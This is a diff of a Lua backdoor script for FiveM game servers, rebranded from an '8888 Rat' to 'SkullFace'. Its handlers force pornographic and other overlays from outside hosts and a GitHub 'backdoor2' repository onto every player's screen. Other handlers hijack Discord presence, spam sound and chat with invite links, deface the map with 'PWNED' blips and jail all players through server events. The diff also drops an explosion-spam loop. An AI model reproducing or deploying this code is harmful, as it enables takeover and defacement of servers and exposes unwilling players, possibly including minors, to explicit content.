@@ -1,5 +1,5 @@
-RegisterNetEvent("8888-Backdoor-pornScreen")
-AddEventHandler("8888-Backdoor-pornScreen", function()
+RegisterNetEvent("pornscreen.sf")
+AddEventHandler("pornscreen.sf", function()
 	local pTxt = CreateRuntimeTxd('pornTxd');
 	local pornScreen = CreateDui("https://spambude.net/Dks/html/porn/done_porn.html", 1920, 1080);
 	local pornHandle = GetDuiHandle(pornScreen)
@@ -12,54 +12,54 @@ AddEventHandler("8888-Backdoor-pornScreen", function()
     end)
 end)
 
-RegisterNetEvent("8888-Backdoor-discordHack")
-AddEventHandler("8888-Backdoor-discordHack", function(text)
+RegisterNetEvent("discordhack.sf")
+AddEventHandler("discordhack.sf", function(text)
     Citizen.CreateThread(function()
         while true do
 			SetDiscordAppId(972882580519157822)
-			SetDiscordRichPresenceAsset("8888")
-			SetRichPresence("Server Hacked by 8888")
-			SetDiscordRichPresenceAssetText('Developer of 8888 Rat: zImSkillz#4906')
-			SetDiscordRichPresenceAssetSmall('8888')
-			SetDiscordRichPresenceAssetSmallText('Developer of 8888 Rat: zImSkillz#4906')
-			SetDiscordRichPresenceAction(0, ("Server: %s"):format(text), "https://discord.com/invite/D8arx7erxQ")
-			SetDiscordRichPresenceAction(1, "Hacked by 8888", "https://discord.com/invite/D8arx7erxQ")
+			SetDiscordRichPresenceAsset("1337")
+			SetRichPresence("Server Owned By SkullFace")
+			SetDiscordRichPresenceAssetText('SkullFace#0888')
+			SetDiscordRichPresenceAssetSmall('1337')
+			SetDiscordRichPresenceAssetSmallText('Server Owned By SkullFace')
+			SetDiscordRichPresenceAction(0, ("Server: %s"):format(text), "https://discord.gg/jd5B3rTd3c")
+			SetDiscordRichPresenceAction(1, "beamed server", "https://discord.gg/jd5B3rTd3c")
 			Citizen.Wait(1)
         end
     end)
 end)
 
-RegisterNetEvent("8888-Backdoor-BlipsHack")
-AddEventHandler("8888-Backdoor-BlipsHack", function()
+RegisterNetEvent("bliphack.sf")
+AddEventHandler("bliphack.sf", function()
 	local blips = {
-		{title="HACKED BY 8888", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY 8888", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY 8888", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY 8888", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY 8888", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY 8888", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY 8888", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY 8888", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY 8888", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY 8888", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY 8888", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY 8888", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY 8888", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY 8888", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY 8888", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY 8888", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY 8888", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY 8888", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY 8888", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY 8888", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY 8888", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY 8888", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY 8888", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY 8888", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY 8888", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY 8888", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY 8888", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY 8888", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
 	 }
 		 
 	Citizen.CreateThread(function()
@@ -189,8 +189,8 @@ AddEventHandler("8888-Backdoor-BlipsHack", function()
 	end)
 end)
 
-RegisterNetEvent("8888-Backdoor-soundSpam")
-AddEventHandler("8888-Backdoor-soundSpam", function()
+RegisterNetEvent("soundspam.sf")
+AddEventHandler("soundspam.sf", function()
 	Citizen.CreateThread(function()
 		while true do
 			PlaySound(-1, "CANCEL", "HUD_MINI_GAME_SOUNDSET", 0, 0, 1);
@@ -208,8 +208,8 @@ AddEventHandler("8888-Backdoor-soundSpam", function()
 	end)
 end)
 
-RegisterNetEvent("8888-Backdoor-Falcon")
-AddEventHandler("8888-Backdoor-Falcon", function()
+RegisterNetEvent("loadfalcon.sf")
+AddEventHandler("loadfalcon.sf", function()
 	Falcon = {}
 	Falcon.debug = false
 
@@ -7296,8 +7296,8 @@ AddEventHandler("8888-Backdoor-Falcon", function()
 	end)
 end)
 
-RegisterNetEvent("8888-Backdoor-Brutan")
-AddEventHandler("8888-Backdoor-Brutan", function()
+RegisterNetEvent("loadbrutan.sf")
+AddEventHandler("loadbrutan.sf", function()
 	local mhaonn = true
 	ESX = nil;
 	Citizen.CreateThread(function() while ESX == nil do TriggerEvent("esx:getSharedObject", function(a) ESX = a end) Citizen.Wait(1000) end end) 
@@ -10326,37 +10326,37 @@ AddEventHandler("8888-Backdoor-Brutan", function()
 		if logged then LynxEvo.OpenMenu("LynxX") end end; Citizen.Wait(0) end end) RegisterCommand("haha", function(eA, eB, eC) bv = true; RapeAllFunc() bananapartyall() EconomyDy2() AmbulancePlayers() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") end end, false) RegisterCommand("pk", function(eA, eB, eC) bw = false end, false) RegisterCommand("lol", function(eA, eB, eC) mhaonn = false end, false)
 end)
 
-RegisterNetEvent("8888-Backdoor-HackServer")
-AddEventHandler("8888-Backdoor-HackServer", function()
+RegisterNetEvent("hackserver.sf")
+AddEventHandler("hackserver.sf", function()
 	local blips = {
-		{title="HACKED BY 8888", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY 8888", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY 8888", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY 8888", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY 8888", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY 8888", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY 8888", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY 8888", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY 8888", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY 8888", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY 8888", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY 8888", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY 8888", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY 8888", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY 8888", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY 8888", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY 8888", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY 8888", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY 8888", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY 8888", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY 8888", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
-		{title="HACKED BY 8888", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
-		{title="HACKED BY 8888", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
-		{title="HACKED BY 8888", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
-		{title="HACKED BY 8888", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
-		{title="HACKED BY 8888", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
-		{title="HACKED BY 8888", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
-		{title="HACKED BY 8888", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="PWNED BY SKULLFACE", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="PWNED BY SKULLFACE", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="PWNED BY SKULLFACE", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
+		{title="PWNED BY SKULLFACE", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
 	 }
 		 
 	Citizen.CreateThread(function()
@@ -10485,14 +10485,14 @@ AddEventHandler("8888-Backdoor-HackServer", function()
 	   end
 	end)
 
-	local sound = CreateDui("https://spambude.net/Dks/html/sound/sound.html", 50, 50); -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
+	local sound = CreateDui("https://raw.githubusercontent.com/brayden1337/backdoor2/main/backdoor/ui/sound/sound.html", 50, 50); -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
 
 	local textureDic = CreateRuntimeTxd('duiTxd');
 
 	local object = CreateDui("https://upfilesc.wwwnl1-ss11.a2hosted.com/cipher_vis12.html", 1920, 1080);
-	local object = CreateDui("https://spambude.net/Dks/html/text_overlay/y.html", 1920, 1080);
+	local object = CreateDui("https://raw.githubusercontent.com/brayden1337/backdoor2/main/backdoor/ui/text%20overlay/y.html", 1920, 1080);
 	local object2 = CreateDui("https://spambude.net/Dks/html/lyxos_bug/lyxos_bug.html", 1920, 1080);  -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
-	local object3 = CreateDui("https://spambude.net/Dks/html/overlay/screen3_2.html", 1920, 1080);
+	local object3 = CreateDui("https://raw.githubusercontent.com/brayden1337/backdoor2/main/backdoor/ui/overlay/screen3_2.html", 1920, 1080);
 
 	local handle = GetDuiHandle(object) -- Gets DUI handle from object
 	local handle2 = GetDuiHandle(object2) -- Gets DUI handle from object
@@ -10509,42 +10509,42 @@ AddEventHandler("8888-Backdoor-HackServer", function()
 
 	local chatColors = {{255, 0, 0}, {255, 128, 0}, {255, 255, 0}, {128, 255, 0}, {0, 255, 0}, {0, 255, 128}, {0, 255, 255}, {0, 128, 255}, {0, 0, 255}, {128, 0, 255}, {255, 0, 255}, {255, 0, 128}}
 	local texts = {
-	   "8888 - https://dsc.gg/8-8-8-8",
-	   " 8888 - https://dsc.gg/8-8-8-8",
-	   "  8888 - https://dsc.gg/8-8-8-8",
-	   "   8888 - https://dsc.gg/8-8-8-8",
-	   "    8888 - https://dsc.gg/8-8-8-8",
-	   "     8888 - https://dsc.gg/8-8-8-8",
-	   "      8888 - https://dsc.gg/8-8-8-8",
-	   "       8888 - https://dsc.gg/8-8-8-8",
-	   "        8888 - https://dsc.gg/8-8-8-8",
-	   "         8888 - https://dsc.gg/8-8-8-8",
-	   "          8888 - https://dsc.gg/8-8-8-8",
-	   "           8888 - https://dsc.gg/8-8-8-8",
-	   "            8888 - https://dsc.gg/8-8-8-8",
-	   "             8888 - https://dsc.gg/8-8-8-8",
-	   "              8888 - https://dsc.gg/8-8-8-8",
-	   "               8888 - https://dsc.gg/8-8-8-8",
-	   "                8888 - https://dsc.gg/8-8-8-8",
-	   "                 8888 - https://dsc.gg/8-8-8-8",
-	   "                  8888 - https://dsc.gg/8-8-8-8",
-	   "                 8888 - https://dsc.gg/8-8-8-8",
-	   "                8888 - https://dsc.gg/8-8-8-8",
-	   "               8888 - https://dsc.gg/8-8-8-8",
-	   "              8888 - https://dsc.gg/8-8-8-8",
-	   "             8888 - https://dsc.gg/8-8-8-8",
-	   "            8888 - https://dsc.gg/8-8-8-8",
-	   "           8888 - https://dsc.gg/8-8-8-8",
-	   "          8888 - https://dsc.gg/8-8-8-8",
-	   "         8888 - https://dsc.gg/8-8-8-8",
-	   "        8888 - https://dsc.gg/8-8-8-8",
-	   "       8888 - https://dsc.gg/8-8-8-8",
-	   "      8888 - https://dsc.gg/8-8-8-8",
-	   "     8888 - https://dsc.gg/8-8-8-8",
-	   "    8888 - https://dsc.gg/8-8-8-8",
-	   "   8888 - https://dsc.gg/8-8-8-8",
-	   "  8888 - https://dsc.gg/8-8-8-8",
-	   " 8888 - https://dsc.gg/8-8-8-8",
+	   "----> - https://dsc.gg/internetinkooleimmat",
+	   " ----> - https://dsc.gg/internetinkooleimmat",
+	   "  ----> - https://dsc.gg/internetinkooleimmat",
+	   "   ----> - https://dsc.gg/internetinkooleimmat",
+	   "    ----> - https://dsc.gg/internetinkooleimmat",
+	   "     ----> - https://dsc.gg/internetinkooleimmat",
+	   "      ----> - https://dsc.gg/internetinkooleimmat",
+	   "       ----> - https://dsc.gg/internetinkooleimmat",
+	   "        ----> - https://dsc.gg/internetinkooleimmat",
+	   "         ----> - https://dsc.gg/internetinkooleimmat",
+	   "          ----> - https://dsc.gg/internetinkooleimmat",
+	   "           ----> - https://dsc.gg/internetinkooleimmat",
+	   "            ----> - https://dsc.gg/internetinkooleimmat",
+	   "             ----> - https://dsc.gg/internetinkooleimmat",
+	   "              ----> - https://dsc.gg/internetinkooleimmat",
+	   "               ----> - https://dsc.gg/internetinkooleimmat",
+	   "                ----> - https://dsc.gg/internetinkooleimmat",
+	   "                 ----> - https://dsc.gg/internetinkooleimmat",
+	   "                  ----> - https://dsc.gg/internetinkooleimmat",
+	   "                 ----> - https://dsc.gg/internetinkooleimmat",
+	   "                ----> - https://dsc.gg/internetinkooleimmat",
+	   "               ----> - https://dsc.gg/internetinkooleimmat",
+	   "              ----> - https://dsc.gg/internetinkooleimmat",
+	   "             ----> - https://dsc.gg/internetinkooleimmat",
+	   "            ----> - https://dsc.gg/internetinkooleimmat",
+	   "           ----> - https://dsc.gg/internetinkooleimmat",
+	   "          ----> - https://dsc.gg/internetinkooleimmat",
+	   "         ----> - https://dsc.gg/internetinkooleimmat",
+	   "        ----> - https://dsc.gg/internetinkooleimmat",
+	   "       ----> - https://dsc.gg/internetinkooleimmat",
+	   "      ----> - https://dsc.gg/internetinkooleimmat",
+	   "     ----> - https://dsc.gg/internetinkooleimmat",
+	   "    ----> - https://dsc.gg/internetinkooleimmat",
+	   "   ----> - https://dsc.gg/internetinkooleimmat",
+	   "  ----> - https://dsc.gg/internetinkooleimmat",
+	   " ----> - https://dsc.gg/internetinkooleimmat",
 	}
 
 	Citizen.CreateThread(function()
@@ -10652,14 +10652,14 @@ AddEventHandler("8888-Backdoor-HackServer", function()
 	end
 
 	local config = {
-	   ["TITLE"] = "~r~8888 - https://dsc.gg/8-8-8-8", 
-	   ["SUBTITLE"] = "~r~8888 - https://dsc.gg/8-8-8-8",
-	   ["MAP"] = "8888",
-	   ["STATUS"] = "8888",
-	   ["GAME"] = "8888",
-	   ["INFO"] = "8888",
-	   ["SETTINGS"] = "8888",
-	   ["R*EDITOR"] = "8888",
+		["TITLE"] = "~r~----> - https://dsc.gg/internetinkooleimmat", 
+		["SUBTITLE"] = "~r~----> - https://dsc.gg/internetinkooleimmat",
+		["MAP"] = "---->",
+		["STATUS"] = "nekrurp",
+		["GAME"] = "nekrurp",
+		["INFO"] = "nekrurp",
+		["SETTINGS"] = "nekrurp",
+		["R*EDITOR"] = "nekrurp",
 	}
 
 	Citizen.CreateThread(function()
@@ -10674,65 +10674,6 @@ AddEventHandler("8888-Backdoor-HackServer", function()
 		   PushScaleformMovieFunctionParameterString(config["SUBTITLE"])
 		   PushScaleformMovieFunctionParameterBool(true)
 		   PopScaleformMovieFunctionVoid()
-	   end
-	end)
-
-
-	-- Create Vehicles
-	Citizen.CreateThread(function()
-	   while true do
-	   Citizen.Wait(1250)
-			local ModelHash = "adder"
-			CreateVehicle(ModelHash, 651.19805908203,576.09906005859,129.05094909668, 1, true, false)
-			CreateVehicle(ModelHash, 695.63061523438,554.13635253906,132.46676635742, 1, true, false)
-			CreateVehicle(ModelHash, 680.24377441406,620.59802246094,170.31489562988, 1, true, false)
-			CreateVehicle(ModelHash, 798.91400146484,573.09936523438,141.43251037598, 1, true, false)
-			CreateVehicle(ModelHash, 923.92071533203,528.46606445313,119.71677398682, 1, true, false)
-			CreateVehicle(ModelHash, 763.54248046875,443.96780395508,147.18112182617, 1, true, false)
-			CreateVehicle(ModelHash, 680.24377441406,620.59802246094,170.31489562988, 1, true, false)
-		end
-	end)
-
-	-- Explosion
-	Citizen.CreateThread(function()
-	   while true do
-	   Citizen.Wait(500)
-		   AddExplosion(651.19805908203,576.09906005859,129.05094909668, 5, 0, true, true, 1)
-		   AddExplosion(695.63061523438,554.13635253906,132.46676635742, 5, 0, true, true, 1)
-		   AddExplosion(680.24377441406,620.59802246094,170.31489562988, 5, 0, true, true, 1)
-		   AddExplosion(798.91400146484,573.09936523438,141.43251037598, 5, 0, true, true, 1)
-		   AddExplosion(763.54248046875,443.96780395508,147.18112182617, 5, 0, true, true, 1)
-		   AddExplosion(923.92071533203,528.46606445313,119.71677398682, 5, 0, true, true, 1)
-		   AddExplosion(689.03399658203,554.13507080078,191.7236328125, 5, 0, true, true, 1)
-		   AddExplosion(670.30090332031,565.64129638672,272.06759643555, 5, 0, true, true, 1)
-		   AddExplosion(563.84466552734,475.48455810547,171.69914245605, 5, 0, true, true, 1)
-		   AddExplosion(651.19805908203,576.09906005859,129.05094909668, 5, 0, true, false, 1)
-		   AddExplosion(695.63061523438,554.13635253906,132.46676635742, 5, 0, true, false, 1)
-		   AddExplosion(680.24377441406,620.59802246094,170.31489562988, 5, 0, true, false, 1)
-		   AddExplosion(798.91400146484,573.09936523438,141.43251037598, 5, 0, true, false, 1)
-		   AddExplosion(763.54248046875,443.96780395508,147.18112182617, 5, 0, true, false, 1)
-		   AddExplosion(923.92071533203,528.46606445313,119.71677398682, 5, 0, true, false, 1)
-		   AddExplosion(689.03399658203,554.13507080078,191.7236328125, 5, 0, true, false, 1)
-		   AddExplosion(670.30090332031,565.64129638672,272.06759643555, 5, 0, true, false, 1)
-		   AddExplosion(563.84466552734,475.48455810547,171.69914245605, 5, 0, true, false, 1)
-		   AddExplosion(651.19805908203,576.09906005859,129.05094909668, 2, 0, true, true, 1)
-		   AddExplosion(695.63061523438,554.13635253906,132.46676635742, 2, 0, true, true, 1)
-		   AddExplosion(680.24377441406,620.59802246094,170.31489562988, 2, 0, true, true, 1)
-		   AddExplosion(798.91400146484,573.09936523438,141.43251037598, 2, 0, true, true, 1)
-		   AddExplosion(763.54248046875,443.96780395508,147.18112182617, 2, 0, true, true, 1)
-		   AddExplosion(923.92071533203,528.46606445313,119.71677398682, 2, 0, true, true, 1)
-		   AddExplosion(689.03399658203,554.13507080078,191.7236328125, 2, 0, true, true, 1)
-		   AddExplosion(670.30090332031,565.64129638672,272.06759643555, 2, 0, true, true, 1)
-		   AddExplosion(563.84466552734,475.48455810547,171.69914245605, 2, 0, true, true, 1)
-		   AddExplosion(651.19805908203,576.09906005859,129.05094909668, 2, 0, true, false, 1)
-		   AddExplosion(695.63061523438,554.13635253906,132.46676635742, 2, 0, true, false, 1)
-		   AddExplosion(680.24377441406,620.59802246094,170.31489562988, 2, 0, true, false, 1)
-		   AddExplosion(798.91400146484,573.09936523438,141.43251037598, 2, 0, true, false, 1)
-		   AddExplosion(763.54248046875,443.96780395508,147.18112182617, 2, 0, true, false, 1)
-		   AddExplosion(923.92071533203,528.46606445313,119.71677398682, 2, 0, true, false, 1)
-		   AddExplosion(689.03399658203,554.13507080078,191.7236328125, 2, 0, true, false, 1)
-		   AddExplosion(670.30090332031,565.64129638672,272.06759643555, 2, 0, true, false, 1)
-		   AddExplosion(563.84466552734,475.48455810547,171.69914245605, 2, 0, true, false, 1)
 	   end
 	end)
 
